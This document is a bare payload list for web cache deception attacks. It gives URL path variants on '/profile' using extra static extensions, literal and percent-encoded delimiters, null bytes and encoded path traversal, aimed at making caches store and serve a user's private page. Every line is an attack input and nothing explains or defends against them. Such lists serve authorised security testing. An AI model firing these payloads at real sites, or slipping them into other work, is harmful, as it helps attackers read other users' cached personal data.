# Payload Collection

## Static Extension

/profile/test.css
/profile/test.js
/profile/test.ico
/profile/test.exe

## Delimiters

/profile;test.css
/profile,test.css
/profile:test.css
/profile|test.css

## Encoded Delimiters

/profile%23test.css
/profile%3ftest.css
/profile%00test.css
/profile%09test.css
/profile%0atest.css

## Origin Normalization

/static/..%2fprofile
/assets/..%2fprofile
/images/..%2fprofile

## Cache Normalization

/profile;%2f%2e%2e%2fstatic
/profile;%2f%2e%2e%2fassets
/profile;%2f%2e%2e%2fimages

## Exact Match Rules

/profile%2f%2e%2e%2ffavicon.ico
/profile%2f%2e%2e%2frobots.txt
/profile%2f%2e%2e%2findex.html
